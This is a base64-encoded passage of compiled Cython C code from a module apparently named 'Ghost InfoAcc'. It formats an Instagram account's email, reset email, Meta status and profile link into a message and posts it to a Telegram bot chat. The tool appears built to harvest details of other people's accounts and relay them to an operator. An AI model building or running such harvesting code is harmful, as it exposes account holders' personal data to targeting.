X19weXhfdF8xNjsKICAgICAgX19weXhfdF8yMFsxNl0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1Jlc2V0X0VtYWlsOwogICAgICBfX3B5eF90XzIwWzE3XSA9IF9fcHl4X3RfMTc7CiAgICAgIF9fcHl4X3RfMjBbMThdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9NZXRhX1N0YXR1czsKICAgICAgX19weXhfdF8yMFsxOV0gPSBfX3B5eF90XzE4OwogICAgICBfX3B5eF90XzIwWzIwXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfUHJvZmlsZV9MaW5rX2h0dHBzX3d3d19pbnN0YWdyYTsKICAgICAgX19weXhfdF8yMFsyMV0gPSBfX3B5eF90XzE5OwogICAgICBfX3B5eF90XzIwWzIyXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfRGV2c19HSE9TVF9SRlg7CiAgICAgIF9fcHl4X3RfMjEgPSBfX1B5eF9QeVVuaWNvZGVfSm9pbihfX3B5eF90XzIwLCAyMywgMTM3ICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF8xKSArIDIzICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF84KSArIDIxICogNiArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3ZfZW1haWwpICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF83KSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMikgKyAyMiAqIDIgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzE0KSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMTUpICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF8xNikgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzE3KSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMTgpICsgNDcgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzE5KSArIDEwMSwgMTExNDExMSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzEpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfOCkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdl9lbWFpbCkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF83KSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzIpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfMTQpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfMTUpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfMTYpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfMTcpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfMTkpKTsKICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIxKSkgX19QWVhfRVJSKDAsIDMzNSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIxKTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE0KTsgX19weXhfdF8xNCA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE1KTsgX19weXhfdF8xNSA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE2KTsgX19weXhfdF8xNiA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE3KTsgX19weXhfdF8xNyA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE4KTsgX19weXhfdF8xOCA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE5KTsgX19weXhfdF8xOSA9IDA7CiAgICAgIF9fcHl4X3Zfc3MgPSAoKFB5T2JqZWN0KilfX3B5eF90XzIxKTsKICAgICAgX19weXhfdF8yMSA9IDA7CgogICAgICAKICAgICAgX19weXhfdF8yMSA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIxKSkgX19QWVhfRVJSKDAsIDM1NiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIxKTsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMjEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90ZXh0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfRGV2ZWxvcGVyKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM1NiwgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzIxLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXJsLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2h0dHBzX3RfbWVfR0hPU1RfUkZYKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM1NiwgX19weXhfTDNfZXJyb3IpCgogICAgICAKICAgICAgX19weXhfdF8xOSA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE5KSkgX19QWVhfRVJSKDAsIDM1NywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE5KTsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMTksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90ZXh0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQ2hhbm5lbCkgPCAoMCkpIF9fUFlYX0VSUigwLCAzNTcsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8xOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3VybCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9odHRwc190X21lX3Y2ZjRDNjFkMExOak5EWmgpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzU3LCBfX3B5eF9MM19lcnJvcikKCiAgICAgIAogICAgICBfX3B5eF90XzE4ID0gUHlMaXN0X05ldygyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE4KSkgX19QWVhfRVJSKDAsIDM1NiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE4KTsKICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzIxKTsKICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzE4LCAwLCBfX3B5eF90XzIxKSAhPSAoMCkpIF9fUFlYX0VSUigwLCAzNTYsIF9fcHl4X0wzX2Vycm9yKTsKICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzE5KTsKICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzE4LCAxLCBfX3B5eF90XzE5KSAhPSAoMCkpIF9fUFlYX0VSUigwLCAzNTYsIF9fcHl4X0wzX2Vycm9yKTsKICAgICAgX19weXhfdF8yMSA9IDA7CiAgICAgIF9fcHl4X3RfMTkgPSAwOwogICAgICBfX3B5eF90XzE5ID0gUHlMaXN0X05ldygxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE5KSkgX19QWVhfRVJSKDAsIDM1NiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE5KTsKICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzE4KTsKICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzE5LCAwLCBfX3B5eF90XzE4KSAhPSAoMCkpIF9fUFlYX0VSUigwLCAzNTYsIF9fcHl4X0wzX2Vycm9yKTsKICAgICAgX19weXhfdF8xOCA9IDA7CiAgICAgIF9fcHl4X3ZfaW5saW5lX2tleWJvYXJkID0gKChQeU9iamVjdCopX19weXhfdF8xOSk7CiAgICAgIF9fcHl4X3RfMTkgPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfMTkgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoMyk7IGlmICh1bmxpa2VseSghX19weXhfdF8xOSkpIF9fUFlYX0VSUigwLCAzNTgsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xOSk7CiAgICAgIF9fcHl4X3RfMTggPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3Zfc2VsZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3VzZXJfaWQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTgpKSBfX1BZWF9FUlIoMCwgMzU4LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTgpOwogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8xOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NoYXRfaWQsIF9fcHl4X3RfMTgpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzU4LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTgpOyBfX3B5eF90XzE4ID0gMDsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMTksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90ZXh0LCBfX3B5eF92X3NzKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM1OCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fcHl4X3RfMjEgPSBOVUxMOwogICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMTcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9qc29uKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE3KSkgX19QWVhfRVJSKDAsIDM1OCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE3KTsKICAgICAgX19weXhfdF8xNiA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8xNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2R1bXBzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE2KSkgX19QWVhfRVJSKDAsIDM1OCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE2KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTcpOyBfX3B5eF90XzE3ID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzE3ID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTcpKSBfX1BZWF9FUlIoMCwgMzU5LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTcpOwogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8xNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2lubGluZV9rZXlib2FyZCwgX19weXhfdl9pbmxpbmVfa2V5Ym9hcmQpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzU5LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19weXhfdF8zID0gMTsKICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF8xNikpKSB7CiAgICAgICAgX19weXhfdF8yMSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfMTYpOwogICAgICAgIGFzc2VydChfX3B5eF90XzIxKTsKICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfMTYpOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzIxKTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfMTYsIF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgX19weXhfdF8zID0gMDsKICAgICAgfQogICAgICAjZW5kaWYKICAgICAgewogICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzIxLCBfX3B5eF90XzE3fTsKICAgICAgICBfX3B5eF90XzE4ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8xNiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8zLCAoMi1fX3B5eF90XzMpIHwgKF9fcHl4X3RfMypfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMjEpOyBfX3B5eF90XzIxID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNyk7IF9fcHl4X3RfMTcgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE2KTsgX19weXhfdF8xNiA9IDA7CiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE4KSkgX19QWVhfRVJSKDAsIDM1OCwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTgpOwogICAgICB9CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzE5LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVwbHlfbWFya3VwLCBfX3B5eF90XzE4KSA8ICgwKSkgX19QWVhfRVJSKDAsIDM1OCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE4KTsgX19weXhfdF8xOCA9IDA7CiAgICAgIF9fcHl4X3ZfcGF5bG9hZCA9ICgoUHlPYmplY3QqKV9fcHl4X3RfMTkpOwogICAgICBfX3B5eF90XzE5ID0gMDsKCiAgICAgIAogICAgICB7CiAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlCiAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgICAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzEyLCAmX19weXhfdF8xMSwgJl9fcHl4X3RfMTApOwogICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xMik7CiAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzExKTsKICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTApOwogICAgICAgICB7CgogICAgICAgICAgCiAgICAgICAgICBfX3B5eF90XzE4ID0gTlVMTDsKICAgICAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlcXVlc3RzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE2KSkgX19QWVhfRVJSKDAsIDM2MiwgX19weXhfTDI1X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTYpOwogICAgICAgICAgX19weXhfdF8xNyA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8xNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3Bvc3QpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTcpKSBfX1BZWF9FUlIoMCwgMzYyLCBfX3B5eF9MMjVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xNyk7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwOwoKICAgICAgICAgIAogICAgICAgICAgX19weXhfdF8xNiA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl9zZWxmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdG9rZW4pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTYpKSBfX1BZWF9FUlIoMCwgMzYzLCBfX3B5eF9MMjVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xNik7CiAgICAgICAgICBfX3B5eF90XzIxID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3RfMTYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMjEpKSBfX1BZWF9FUlIoMCwgMzYzLCBfX3B5eF9MMjVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yMSk7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwOwogICAgICAgICAgX19weXhfdF8yMlswXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfaHR0cHNfYXBpX3RlbGVncmFtX29yZ19ib3Q7CiAgICAgICAgICBfX3B5eF90XzIyWzFdID0gX19weXhfdF8yMTsKICAgICAgICAgIF9fcHl4X3RfMjJbMl0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3NlbmRNZXNzYWdlOwogICAgICAgICAgX19weXhfdF8xNiA9IF9fUHl4X1B5VW5pY29kZV9Kb2luKF9fcHl4X3RfMjIsIDMsIDI4ICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF8yMSkgKyAxMiwgMTI3IHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfMjEpKTsKICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xNikpIF9fUFlYX0VSUigwLCAzNjMsIF9fcHl4X0wyNV9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE2KTsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIxKTsgX19weXhfdF8yMSA9IDA7CiAgICAgICAgICBfX3B5eF90XzMgPSAxOwogICAgICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMTcpKSkgewogICAgICAgICAgICBfX3B5eF90XzE4ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF8xNyk7CiAgICAgICAgICAgIGFzc2VydChfX3B5eF90XzE4KTsKICAgICAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzE3KTsKICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTgpOwogICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzE3LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgICAgICBfX3B5eF90XzMgPSAwOwogICAgICAgICAgfQogICAgICAgICAgI2VuZGlmCiAgICAgICAgICB7CiAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syICsgKChDWVRIT05fVkVDVE9SQ0FMTCkgPyAyIDogMCldID0ge19fcHl4X3RfMTgsIF9fcHl4X3RfMTZ9OwogICAgICAgICAgICBfX3B5eF90XzIxID0gX19QeXhfTWFrZVZlY3RvcmNhbGxCdWlsZGVyS3dkcygyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIxKSkgX19QWVhfRVJSKDAsIDM2MiwgX19weXhfTDI1X2Vycm9yKQogICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yMSk7CiAgICAgICAgICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGEsIF9fcHl4X3ZfcGF5bG9hZCwgX19weXhfdF8yMSwgX19weXhfY2FsbGFyZ3MrMiwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAzNjIsIF9fcHl4X0wyNV9lcnJvcikKICAgICAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGltZW91dCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEwLCBfX3B5eF90XzIxLCBfX3B5eF9jYWxsYXJncysyLCAxKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM2MiwgX19weXhfTDI1X2Vycm9yKQogICAgICAgICAgICBfX3B5eF90XzE5ID0gX19QeXhfT2JqZWN0X1ZlY3RvcmNhbGxfQ2FsbEZyb21CdWlsZGVyKF9fcHl4X3RfMTcsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMywgKDItX19weXhfdF8zKSB8IChfX3B5eF90XzMqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSwgX19weXhfdF8yMSk7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOCk7IF9fcHl4X3RfMTggPSAwOwogICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwOwogICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yMSk7IF9fcHl4X3RfMjEgPSAwOwogICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNyk7IF9fcHl4X3RfMTcgPSAwOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTkpKSBfX1BZWF9FUlIoMCwgMzYyLCBfX3B5eF9MMjVfZXJyb3IpCiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE5KTsKICAgICAgICAgIH0KICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE5KTsgX19weXhfdF8xOSA9IDA7CgogICAgICAgICAgCiAgICAgICAgfQogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgICAgIGdvdG8gX19weXhfTDMwX3RyeV9lbmQ7CiAgICAgICAgX19weXhfTDI1X2Vycm9yOjsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE0KTsgX19weXhfdF8xNCA9IDA7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE1KTsgX19weXhfdF8xNSA9IDA7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE2KTsgX19weXhfdF8xNiA9IDA7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE3KTsgX19weXhfdF8xNyA9IDA7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE4KTsgX19weXhfdF8xOCA9IDA7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE5KTsgX19weXhfdF8xOSA9IDA7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yMSk7IF9fcHl4X3RfMjEgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CgogICAgICAgIAogICAgICAgIF9fcHl4X3RfMjMgPSBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzKCgoUHlPYmplY3QgKikoKChQeVR5cGVPYmplY3QqKVB5RXhjX0V4Y2VwdGlvbikpKSk7CiAgICAgICAgaWYgKF9fcHl4X3RfMjMpIHsKICAgICAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygidGYuR2hvc3QuSW5mb0FjYyIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogICAgICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF8xOSwgJl9fcHl4X3RfMTcsICZfX3B5eF90XzIxKSA8IDApIF9fUFlYX0VSUigwLCAzNjQsIF9fcHl4X0wyN19leGNlcHRfZXJyb3IpCiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTkpOwogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE3KTsKICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yMSk7CiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xNyk7CiAgICAgICAgICBfX3B5eF92X2UgPSBfX3B5eF90XzE3OwogICAgICAgICAgIHsKCiAgICAgICAgICAgIAogICAgICAgICAgICBfX3B5eF90XzE4ID0gTlVMTDsKICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fcHJpbnQpOwogICAgICAgICAgICBfX3B5eF90XzE1ID0gX19weXhfYnVpbHRpbl9wcmludDsgCiAgICAgICAgICAgIF9fcHl4X3RfMyA9IDE7CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV99OwogICAgICAgICAgICAgIF9fcHl4X3RfMTYgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzE1LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzMsICgyLV9fcHl4X3RfMykgfCAoX19weXhfdF8zKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOCk7IF9fcHl4X3RfMTggPSAwOwogICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE1KTsgX19weXhfdF8xNSA9IDA7CiAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE2KSkgX19QWVhfRVJSKDAsIDM2NSwgX19weXhfTDM2X2Vycm9yKQogICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE2KTsKICAgICAgICAgICAgfQogICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwOwogICAgICAgICAgfQoKICAgICAgICAgIAogICAgICAgICAgIHsKICAgICAgICAgICAgewogICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF92X2UpOyBfX3B5eF92X2UgPSAwOwogICAgICAgICAgICAgIGdvdG8gX19weXhfTDM3OwogICAgICAgICAgICB9CiAgICAgICAgICAgIF9fcHl4X0wzNl9lcnJvcjo7CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKICAgICAgICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgogICAgICAgICAgICAgIF9fcHl4X3RfMjYgPSAwOyBfX3B5eF90XzI3ID0gMDsgX19weXhfdF8yOCA9IDA7IF9fcHl4X3RfMjkgPSAwOyBfX3B5eF90XzMwID0gMDsgX19weXhfdF8